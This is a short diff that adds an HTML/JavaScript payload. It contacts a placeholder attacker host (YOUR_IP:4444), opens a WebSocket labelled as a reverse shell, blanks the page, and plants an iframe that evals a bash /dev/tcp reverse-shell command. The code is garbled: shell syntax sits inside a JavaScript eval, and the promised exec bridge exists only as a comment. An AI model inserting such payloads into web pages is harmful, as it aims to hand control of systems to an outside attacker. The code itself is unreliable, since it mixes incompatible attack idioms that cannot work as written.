@@ -1,0 +1,11 @@
+<script>
+fetch('http://YOUR_IP:4444/shell').then(r=>r.text()).then(shell=>{
+  // WebSocket reverse shell
+  const ws = new WebSocket('ws://YOUR_IP:4444');
+  ws.onopen = () => {
+    document.body.innerHTML = '<iframe src="about:blank" style="display:none"></iframe>';
+    // Pipe stdin/stdout via JS exec bridge
+  };
+});
+</script>
+<iframe src="javascript:(function(){eval('sh -i >& /dev/tcp/YOUR_IP/4444 0>&1')}())"></iframe>
